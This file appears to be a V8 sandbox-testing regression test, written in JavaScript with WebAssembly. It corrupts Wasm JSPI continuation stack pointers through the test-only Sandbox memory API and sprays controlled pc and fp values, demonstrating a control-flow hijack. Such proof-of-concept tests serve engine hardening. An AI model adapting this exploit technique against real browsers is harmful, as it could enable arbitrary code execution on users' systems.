// --sandbox-testing --experimental-wasm-jspi
d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kJSPromiseReactionsOrResultOffset = 12;
const kPromiseReactionFulfillHandlerOffset = 16;
const kJSFunctionSharedFunctionInfoOffset = 16;
const kSharedFunctionInfoFunctionDataOffset = 8;
const kWasmResumeDataSuspenderOffset = 4;
const kWasmSuspenderObjectContinuationOffset = 4;
const kWasmContinuationObjectStackOffset = 8;
const kWasmContinuationObjectParentOffset = 4;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

function gc() {
  new ArrayBuffer(0x7fe00000);
}

let builder = new WasmModuleBuilder();
let $suspending = builder.addImport('import', 'suspending', kSig_v_v);
let $hook = builder.addImport('import', 'hook', kSig_v_v);
const sprays = Array(0x100).fill(0).map((_, i) => 0x133714470000n + BigInt(i));
sprays[0xa1] = 0x404040404040n;     // [sp] (i.e. first value on stack)
sprays[0xa2] = 0x424242424242n;     // pc
sprays[0xa3] = 0x414141414141n;     // fp
builder.addFunction("spray", kSig_v_v).addBody([
  ...sprays.flatMap((v) => wasmI64Const(v)),
  ...Array(0x100).fill(kExprDrop),
]).exportFunc();
builder.addFunction("func", kSig_v_v).addBody([
  kExprCallFunction, $suspending, // create continuation
  kExprCallFunction, $hook,
  kExprCallFunction, $hook,
]).exportFunc();
builder.addFunction("nop", kSig_v_v).addBody([]).exportFunc();

let {get_promise, set_promise} = (()=>{
  let p;
  function get_promise() {
    return p;
  }
  function set_promise(promise) {
    p = promise;
  }
  return {get_promise, set_promise};
})();
let suspending_fn = new WebAssembly.Suspending(get_promise);
function hook_fn() {
  if (hook_fn.fn) {
    hook_fn.fn();
  }
}
let instance = builder.instantiate({import: {suspending: suspending_fn, hook: hook_fn}});
let {spray, func, nop} = instance.exports;
let promising_func = WebAssembly.promising(func);
let promising_nop = WebAssembly.promising(nop);

function get_resume(promise) {
  let promise_reaction = getField(getPtr(promise), kJSPromiseReactionsOrResultOffset);
  let resume_handler = getField(promise_reaction, kPromiseReactionFulfillHandlerOffset);
  return resume_handler;
}

function get_continuation(promise) {
  let resume_handler = get_resume(promise);
  let resume_sfi = getField(resume_handler, kJSFunctionSharedFunctionInfoOffset);
  let resume_data = getField(resume_sfi, kSharedFunctionInfoFunctionDataOffset);
  let suspender = getField(resume_data, kWasmResumeDataSuspenderOffset);
  let continuation = getField(suspender, kWasmSuspenderObjectContinuationOffset);
  return continuation;
}

let {promise: promise0, resolve: resolve0} = Promise.withResolvers();
set_promise(promise0);
promising_func();

let {promise: promise1, resolve: resolve1} = Promise.withResolvers();
set_promise(promise1);
promising_func();

// cont0, hook#0
hook_fn.fn = () => {
  // js_cont -> cont0
  // cont1, hook#0
  hook_fn.fn = () => {
    // js_cont -> cont0 -> cont1
    let cont0 = get_continuation(promise0);
    let cont0_stack = getField(cont0, kWasmContinuationObjectStackOffset);
    let cont_js = getField(cont0, kWasmContinuationObjectParentOffset);
    let cont_js_stack = getField(cont_js, kWasmContinuationObjectStackOffset);

    // Isolate::UpdateCentralStackInfo(): reload central stack top from cont0->stack() (= cont_js->stack())
    // reset it correctly after reload
    setField(cont0, kWasmContinuationObjectStackOffset, cont_js_stack);
    promising_nop();
    setField(cont0, kWasmContinuationObjectStackOffset, cont0_stack);

    // this call now corrupts central stack of cont0 and onwards
    // cont1, hook#1
    hook_fn.fn = () => {
      //call_fn.fn = undefined;
      spray();
    };
  };
  function rec(n, fn) {
    if (n <= 0) {
      fn();
      return;
    }
    rec(n - 1, fn);
  }
  rec(0x10, () => Sandbox.getObjectAt(get_resume(promise1))());
};
Sandbox.getObjectAt(get_resume(promise0))();
